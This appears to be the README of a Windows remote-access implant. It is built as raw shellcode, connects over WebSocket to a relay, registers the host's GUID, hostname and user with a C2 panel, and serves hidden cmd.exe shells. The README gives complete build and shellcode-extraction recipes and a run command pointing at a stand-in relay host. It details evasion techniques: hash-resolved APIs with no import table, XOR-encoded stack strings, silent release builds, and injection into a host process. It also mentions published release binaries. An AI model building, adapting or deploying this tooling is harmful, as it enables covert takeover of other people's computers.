# minimal_agent — a dependency-free Windows agent

A small C program that connects to a relay over WebSocket, introduces
itself with HTTP headers on the upgrade, and serves panel commands
inside a local `cmd.exe` (the Shell capability).

What makes it interesting is what it does NOT have:

- **no CRT** — no printf, no malloc, no startup code from the C runtime;
- **no import table** — not a single DLL is listed in the PE imports;
  every OS call, WinHTTP included, is found at runtime by walking the
  process's own module list (the PEB) and matching name hashes;
- **no strings in the binary** — API names live as precomputed hash
  constants inside instructions; every string the agent needs (the DLL
  names, the user agent, the identity headers, …) is built on the
  stack, XOR-decoded as it is written;
- **no `.bss`** — nothing static; everything lives on stack frames
  chosen so their lifetime matches what the data needs;
- **logging is a build option, not a feature** — a release build is
  silent and contains no log strings at all; a dev build
  (`-DLOGGING_ENABLED`) speaks printf (`LOG_INFO("Shell %d opened", id)`)
  through a hand-rolled formatter.

The deliverable shape is a single-`.text` blob (raw shellcode): the
exe is the same code inside a PE envelope, and `.bin` is that envelope
peeled off — byte 0 is the entry point.

---

## What you need

- Windows 8+ (WinHTTP's WebSocket API)
- **MinGW-w64 gcc** from MSYS2 (`ucrt64` environment). Nothing else -
  no SDK headers, no libraries: the project carries its own minimal
  type dictionary (`types.h`, `wintypes.h`) and resolves everything
  else at runtime.

---

## Build

Two steps: compile the sources, then link the objects into the exe.
Two rules make or break the result — both are enforced by CI gates:

1. **`entry.o` must be the FIRST object on the link line.** `entry.c`
   holds nothing but `entry()` (the stack probes live in
   `src/stack_probes.c`), so the linker places it at byte 0 of
   `.text`. If a glob like `obj\*.o` sorts another object first, the
   exe still runs (Windows jumps by the PE header) but the raw `.bin`
   blob starts with the wrong code and dies instantly.
2. **Flags are a set** — drop one and the binary silently regains a
   `.rdata` section (pooled constants) that kills the blob. See the
   notes under each command.

### PowerShell (from the repo root)

```powershell
# 1) Start clean so release and debug objects cannot be mixed.
Remove-Item -Recurse -Force obj -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Force obj | Out-Null

# 2) Compile. Sources: entry.c in the root, the rest in src\, headers in include\.
gcc -O2 -DLOGGING_ENABLED -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize -c entry.c src/stack_probes.c src/main.c src/transport.c src/shell.c src/system_facts.c src/environment.c src/winhttp_api.c src/ntdll.c src/kernel32.c src/advapi.c src/string.c src/memory.c src/peb.c src/system.c src/djb2.c src/logger.c src/picfixup.c

# 3) Park the objects.
Move-Item *.o obj

# 4) Link - entry.o FIRST, then the rest.
gcc -O2 -s -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize -nostdlib -T linker.ld -e entry -o minimal_agent.exe ( @(Get-Item obj\entry.o) + (Get-ChildItem obj\*.o -Exclude entry.o) | ForEach-Object FullName )
```

### bash (MSYS2 shell)

```sh
rm -rf obj
mkdir -p obj
gcc -O2 -DLOGGING_ENABLED -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize \
    -c entry.c src/stack_probes.c src/main.c src/transport.c src/shell.c src/report.c src/system_facts.c src/environment.c src/winhttp_api.c src/ntdll.c src/kernel32.c src/advapi.c src/string.c src/memory.c src/peb.c src/system.c src/djb2.c src/logger.c src/command.c
mv *.o obj/
gcc -O2 -s -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize \
  -nostdlib -T linker.ld -e entry  -o minimal_agent.exe obj/entry.o $(ls obj/*.o | grep -v '/entry.o$')
```

Every command in this section is what the recipe in
[Making the shellcode](#making-the-shellcode-agentbin) below spells
out end to end.

### Why these exact flags

- `-fno-asynchronous-unwind-tables` drops the SEH unwind tables
  (`.pdata`/`.xdata`) the agent never uses. Its required companion
  `-fno-shrink-wrap` stops gcc from scattering prologues once the
  tables are gone (measured +1 KB of code otherwise).
- `-fno-jump-tables` keeps switch address tables (which are `.rdata`
  data) out of the binary.
- `-fno-tree-vectorize -fno-tree-slp-vectorize` (gcc; clang:
  `-fno-vectorize -fno-slp-vectorize`) stop the compiler from pooling
  the XOR constants of stack strings into an SSE payload in `.rdata` —
  in the raw blob those rip-relative loads point past the end and the
  first string read faults.

### Two coding rules that keep the blob alive

The build contract is **nothing outside `.text` may be referenced by
the code**. Two C constructs violate it silently:

- **Brace initializers with non-zero content** (`= {24, NULL, TRUE}`):
  both compilers may materialize the aggregate into `.rdata` and copy
  it with rip-relative loads. Use `MemoryZero` + explicit field stores.
- **String literals** (narrow or wide): they ARE `.rdata` by
  definition. Every runtime string goes through a stack-string builder
  (`stackstrings.h`), written byte-by-byte with a volatile key.

---

## Check your build (the gates)

**Gate 1 — the import table must be EMPTY.** A single `DLL Name:`
line means something pulled a library back in.

```powershell
objdump -p minimal_agent.exe | findstr /C:"DLL Name:"     # prints NOTHING = pass
```

**Gate 2 — entry() at `.text` byte 0.** The exe is stripped, so read
the PE header and compare against the section table:

```powershell
objdump -f minimal_agent.exe | findstr /C:"start address"
objdump -h minimal_agent.exe                              # .text VMA line
# start address must EQUAL the .text VMA (both e.g. 0x140001000) = pass
```

**Gate 3 — the blob must not start with the PE header.** See below.

### Section scoreboard

```powershell
objdump -h minimal_agent.exe | findstr /C:".text" /C:".rdata" /C:".bss" /C:".pdata"
```

| Section | Size | Meaning |
|---|---|---|
| `.text` | ~22 KB | everything the agent is |
| `.rdata` | 32 B | linker weak-extern stub; nothing references it |
| `.idata` | 24 B | empty import-directory placeholder |

---

## Making the shellcode (agent.bin)

The deliverable of this project is the **raw shellcode** — the exe's
`.text` peeled out of the PE envelope. The exe and the shellcode are
the same code; because `entry()` is the first byte of `.text`,
**byte 0 of the file is the entry point**.

The recipe in three shells — pick yours (the `cmd` form is written
as a `.bat`; in an interactive prompt use `%i` instead of `%%i`):

### agent.bin

PowerShell:

```powershell
Remove-Item -Recurse -Force obj -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Force obj | Out-Null

gcc -O2 -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize -c entry.c src/stack_probes.c src/main.c src/transport.c src/shell.c src/report.c src/system_facts.c src/environment.c src/winhttp_api.c src/ntdll.c src/kernel32.c src/advapi.c src/string.c src/memory.c src/peb.c src/system.c src/djb2.c src/logger.c
Move-Item *.o obj

gcc -O2 -s -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize -nostdlib -T linker.ld -e entry -o minimal_agent.exe ( @(Get-Item obj\entry.o) + (Get-ChildItem obj\*.o -Exclude entry.o) | ForEach-Object FullName )
objcopy --dump-section .text=agent.bin minimal_agent.exe
```

cmd (as a `.bat`):

```bat
if exist obj rmdir /s /q obj
mkdir obj

gcc -O2 -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize -c entry.c src/stack_probes.c src/main.c src/transport.c src/shell.c src/report.c src/system_facts.c src/environment.c src/winhttp_api.c src/ntdll.c src/kernel32.c src/advapi.c src/string.c src/memory.c src/peb.c src/system.c src/djb2.c src/logger.c
move *.o obj\ >nul

setlocal enabledelayedexpansion
set OBJS=obj\entry.o
for %%i in (obj\*.o) do if /i not "%%i"=="obj\entry.o" set OBJS=!OBJS! %%i
gcc -O2 -s -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize -nostdlib -T linker.ld -e entry -o minimal_agent.exe !OBJS!
endlocal

objcopy --dump-section .text=agent.bin minimal_agent.exe
```

bash (MSYS2):

```sh
rm -rf obj && mkdir -p obj

gcc -O2 -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident \
    -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize \
    -c entry.c src/stack_probes.c src/main.c src/transport.c \
    src/shell.c src/system_facts.c src/environment.c src/winhttp_api.c \
    src/ntdll.c src/kernel32.c src/advapi.c src/string.c src/memory.c \
    src/peb.c src/system.c src/djb2.c src/logger.c
mv *.o obj/

gcc -O2 -s -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident \
    -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize \
    -nostdlib -T linker.ld -e entry -o minimal_agent.exe \
    obj/entry.o $(ls obj/*.o | grep -v '/entry.o$')

objcopy --dump-section .text=agent.bin minimal_agent.exe
```

`objcopy --dump-section` hands out the section CONTENTS only, under
both GNU objcopy and llvm-objcopy (`-O binary --only-section=.text`
is NOT honored the same way by llvm-objcopy — it can emit the whole
PE image, and the file then starts with `MZ`).

### Verify before shipping

```sh
head -c 2 agent.bin            # must NOT be "MZ"
strings -n 14 agent.bin | grep -cE '[a-z]+ [a-z]+'   # must print 0
```

The literal rule is enforced by a CI gate: a leaked literal is an
English phrase — lowercase words with spaces — so the gate counts
literal-shaped hits, not raw printable runs (clang's register-push
prologues are pure printable ASCII and would false-positive any raw
scan).

---

## Run

The relay URL comes from the **`W_URL` environment variable** (the
no-CRT entry point reads it straight from the PEB environment block —
there is no argv):

```powershell
$env:W_URL = "https://relay.example.com"   # your relay, root path (no /agent)
.\minimal_agent.exe                        # release: silent by design
```

The URL is the relay ROOT — the deployed relay generation accepts the
WebSocket upgrade on `/` (a `/agent` suffix gets a 404, the agent
retries forever).

**Identity is sent automatically.** The X-Agent-* HTTP headers ride
the WebSocket upgrade request itself (API 1): machine UUID (registry
MachineGuid, `Guid.ToString()` form), hostname, user, OS version,
build/commit tags, and the Shell capability bit. Without them the
relay still accepts the socket but the C2 never registers the agent —
its windows never open. Every header is built on the stack,
XOR-encoded — no plaintext in the binary.

Commands carry a correlation id (`[opcode][corrId:4 LE][payload]`) and
every reply echoes it (`[status:4][corrId:4][body]`) — the panel drops
replies whose echo does not match a pending command.

**A release build prints nothing.** Not even errors. It connects,
identifies, and serves; the console just sits there while it works —
that silence is the point of the release flavor. Liveness is
observable from outside: the process stays up, holds a TCP connection
to the relay, and `winhttp.dll` appears in its module list.

### Dev flavor (to see what it does)

Same two steps as the release build with `-DLOGGING_ENABLED`
added to BOTH the compile and the link line (miss one and you get a
silent hybrid), a cleaned `obj\` (mixing release objects in produces
a broken hybrid too), **`src/logfmt.c` in the source list** (the
printf formatter — compiles empty in release), and a distinct output
name:

```powershell
# Clean before compiling the debug objects.
Remove-Item -Recurse -Force obj -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Force obj | Out-Null

gcc -O2 -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize -DLOGGING_ENABLED -c entry.c src/stack_probes.c src/main.c src/transport.c src/shell.c src/system_facts.c src/environment.c src/winhttp_api.c src/ntdll.c src/kernel32.c src/advapi.c src/string.c src/memory.c src/peb.c src/system.c src/djb2.c src/logger.c
Move-Item *.o obj

gcc -O2 -s -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize -DLOGGING_ENABLED -nostdlib -T linker.ld -e entry -o minimal_agent_dev.exe ( @(Get-Item obj\entry.o) + (Get-ChildItem obj\*.o -Exclude entry.o) | ForEach-Object FullName )

$env:W_URL = "https://relay.example.com"
.\minimal_agent_dev.exe
```

It prints (one line per step, values included):

```
[INF] Connecting to relay ...
[INF] Identity headers prepared: 356 byte(s)
[INF] Connected (HTTP 101 Switching Protocols)
[INF] Agent mode: replying to commands (capability mask = Shell)
[INF] recv OpenShell corr=14 len=1
[INF] Shell 0 opened (cmd.exe spawned)
[INF] recv WriteShell corr=15 len=17
[INF] Write to shell 0: 4 byte(s)
[INF] recv ReadShell corr=16 len=9
[INF] Read shell 0 - 174 byte(s)
```

and `[ERR]` lines with the WinHTTP error code when something fails
(`WinHttpSendRequest failed (GLE=12029)`), plus the redial backoff
(`connection lost - redialing in 2 s`).

### What it does on the wire

- connects and upgrades HTTP to WebSocket (an ordinary HTTPS GET with
  `WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET`), carrying the X-Agent-*
  identity headers (API 1) — the relay copies them into its events
  and the C2 registers the agent by its machine UUID;
- `OpenShell` → spawns a hidden `cmd.exe` (code page UTF-8) behind two
  pipes; the slot index IS the shell id (256 slots);
- `WriteShell` / `ReadShell` → feed input / drain output; reads never
  block, the panel's polling drives the flow;
- `CloseShell` → kill the shell, free the slot;
- `Exit` → terminate the agent (the only command with no reply);
- anything else → `status = 1`.

A lost connection is normal, not an error: the agent redials after a
backoff (1..32 s, reset after a healthy session). Live shells survive
a redial — their pool belongs to the process, not the connection.

Because the agent advertises Shell without FileSystem, the panel's
file manager falls back to PowerShell-over-shell — a basic file
browser works with zero file opcodes implemented.

---

## How the code is laid out

| File | What it owns |
|---|---|
| `entry.c` | `entry()` and nothing else: build the URL from the PEB environment, call agent_main, exit via ExitProcess. MUST stay the first object on the link line |
| `src/stack_probes.c` | the `__chkstk`/`__alloca` stack probes for x86_64 / i386 / aarch64 (kept out of entry.c so entry stays byte 0) |
| `main.c` | `agent_main`: owns process-lifetime state on its frame (shell pool, backoff), runs dial/serve/redial; command handlers with the v3 corrId framing |
| `protocol.h` | opcodes, statuses, API-1 constants, capability mask, buffer limits |
| `identity_headers.h/.c` | the X-Agent-* identity block for the upgrade request |
| `wire.h` | tiny little-endian writers (header-only) |
| `transport.h/.c` | the WebSocket pipe: one reply out (`ws_send`), one assembled message in (`ws_receive`) |
| `shell.h/.c` | the cmd.exe pool: spawn / write / drain / teardown, 256 slots |
| `report.h/.c` | dev-only diagnostics: opcode/buffer-type names (compiled out in release) |
| `logger.h/.c` | the two-flavor logging: printf macros over a stack buffer; release compiles to nothing |
| `logfmt.c` | the printf formatter (`Format`/`FormatV`, bounded) — dev-only, empty TU in release |
| `system_facts.h/.c` | hostname, username, OS version (the identity payload) |
| `winhttp_api.h/.c` | the WinHTTP table + the LdrLoadDll bootstrap that maps winhttp.dll |
| `kernel32/ntdll/advapi.h/.c` | one function table per DLL, hash-resolved |
| `peb.h/.c` | TEB/PEB access, the module-list walk, environment reader |
| `system.h/.c` | export-table resolve — by name (tooling) and by hash (the agent) |
| `apihash.h` | the precomputed djb2 constants for every name used |
| `stackstrings.h` | every runtime string, built on the stack, XOR-decoded in the write |
| `djb2.h/.c` | the hash both resolve paths share |
| `string.c` / `memory.c` / `logger.c` | the hand-rolled CRT replacements |

Reading order for a newcomer: `entry.c` (how a process starts without
a runtime) → `peb.c` + `system.c` (how functions are found without
imports) → `stackstrings.h` (how strings exist without existing) →
`transport.c` (the wire) → `main.c` (the loop).

---

## CI / Releases (GitHub Actions)

Cross-builds the three Windows architectures with
[llvm-mingw](https://github.com/mstorsjo/llvm-mingw) (i686 / x86_64 /
aarch64) and bakes the identity metadata (`-DID_BUILD_NUMBER`,
`-DAGENT_COMMIT_HASH`):

- **build.yml** — on push/PR: builds all three arches (release) plus
  dev flavors for i386 and x86_64, and runs the gates (empty imports;
  entry at `.text` byte 0; the `.bin` not starting with `MZ`; no
  separate data sections; no literal-shaped strings in the release
  `.bin`). On pushes to main it also republishes the rolling `preview`
  pre-release — release and dev binaries together, so anyone can grab
  a logging build without compiling;
- **release.yml** — on a `v*` tag: the same gated binaries as a stable
  GitHub Release (`windows-{i386,x86_64,aarch64}.{exe,bin}`) plus dev
  flavors with printf logging for i386 and x86_64
  (`windows-{i386,x86_64}-dev.{exe,bin}`).

Runtime status: **x86_64 and i386 are live-verified** (x86_64
natively; i386 on native 32-bit Windows 8/10 and under WOW64 — PEB
walk, hash resolution, WinHTTP transport, the full connect/backoff
loop, and blob injection into a host process at an arbitrary base).
aarch64 passes every build gate and awaits its ARM64-host run.

The `.bin` assets are cut with `--dump-section .text=…` — byte 0 is
`entry()`, load-and-jump ready. On i386 the dev `.bin` carries its own
PE base-relocation table inside `.text` and applies it at startup
(`src/picfixup.c`): i386 has no RIP-relative addressing, so the
logging literals are absolute-addressed and every load at a foreign
base re-slides them before the first log line. The release `.bin`
needs no such step — it contains zero absolute references.

---

## Honest limitations

- Shell only: no native file or screen opcodes (the panel covers files
  via its PowerShell-over-shell fallback); shells die with the process.
- WinHTTP is loaded at runtime but visible in the process's module
  list for its whole life (removing it is future work).
- The connection pattern (periodic dial to one host, a non-browser
  user agent) is trivially visible to network monitoring — deliberate
  scope: this project studies form, not evasion.
